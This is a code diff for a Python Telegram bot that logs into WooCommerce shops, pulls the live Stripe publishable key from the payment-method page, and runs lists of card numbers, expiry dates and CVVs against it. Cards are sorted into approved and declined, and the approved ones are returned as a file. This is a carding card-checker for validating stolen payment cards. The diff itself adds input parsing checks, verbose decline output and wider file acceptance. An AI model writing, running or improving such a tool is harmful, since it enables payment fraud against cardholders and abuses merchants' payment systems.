@@ -1,7 +1,8 @@
-import logging
 import requests
 import re
 import threading
+import logging
+import json
 from bs4 import BeautifulSoup
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
@@ -13,12 +14,14 @@ logging.basicConfig(level=logging.INFO)
 user_data = {}
 lock = threading.Lock()
 
+
 def get_headers():
     return {
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
         "accept": "text/html,application/xhtml+xml",
         "accept-language": "en-US,en;q=0.9",
     }
+
 
 def detect_stripe_type(html):
     if "setup_intent" in html:
@@ -31,9 +34,11 @@ def detect_stripe_type(html):
         return "token"
     return "unknown"
 
+
 def extract_pk(html):
     match = re.search(r'pk_live_[a-zA-Z0-9]{10,}', html)
     return match.group(0) if match else None
+
 
 def try_login(site, email, password, session):
     login_url = f"https://{site}/my-account/"
@@ -55,6 +60,7 @@ def try_login(site, email, password, session):
 
     r = session.post(login_url, data=payload, headers=get_headers())
     return ("customer-logout" in r.text), r.text
+
 
 async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -81,6 +87,7 @@ async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text("Login successful! Now send the Add Payment Method URL.")
 
+
 async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in user_data:
@@ -104,13 +111,18 @@ async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(f"Stripe key: `{pk_live}`\nType: `{stripe_type}`", parse_mode="Markdown")
 
+
 def parse_card(card):
     match = re.match(r'(\d{13,16})[|:](\d{2})[|:/](\d{2,4})[|:](\d{3,4})', card)
     return match.groups() if match else None
 
+
 def check_card(card, data):
     try:
-        cc, mm, yy, cvv = parse_card(card)
+        parsed = parse_card(card)
+        if not parsed:
+            return f"{card} -> Invalid format"
+        cc, mm, yy, cvv = parsed
         if len(yy) == 2:
             yy = "20" + yy
 
@@ -139,7 +151,7 @@ def check_card(card, data):
         )
         stripe_resp = r.json()
         if 'error' in stripe_resp:
-            return f"{card} -> Declined ❌ ({stripe_resp['error']['message']})"
+            return f"{card} -> Declined ❌\n```json\n{json.dumps(stripe_resp, indent=2)}\n```"
 
         pm_id = stripe_resp['id']
 
@@ -162,13 +174,13 @@ def check_card(card, data):
     except Exception as e:
         return f"{card} -> Error: {e}"
 
+
 async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in user_data:
         await update.message.reply_text("Please use /addsitelogin first.")
         return
 
-    # Ensure input is in the format card|exp_month|exp_year|cvv
     if len(context.args) < 1 or '|' not in context.args[0]:
         await update.message.reply_text("Usage: /chk card|exp_month|exp_year|cvv")
         return
@@ -176,6 +188,7 @@ async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     card = context.args[0]
     result = check_card(card, user_data[user_id])
     await update.message.reply_text(result)
+
 
 async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -207,13 +220,15 @@ async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     with open("approved.txt", "rb") as f:
         await update.message.reply_document(document=BytesIO(f.read()), filename="approved.txt")
 
+
 def main():
     app = ApplicationBuilder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("addsitelogin", addsitelogin))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_url))
-    app.add_handler(MessageHandler(filters.Document.TEXT, mchk))
-    app.add_handler(CommandHandler("chk", chk))  # Added /chk handler
+    app.add_handler(MessageHandler(filters.Document.ALL, mchk))
+    app.add_handler(CommandHandler("chk", chk))
     app.run_polling()
+
 
 if __name__ == "__main__":
     main()
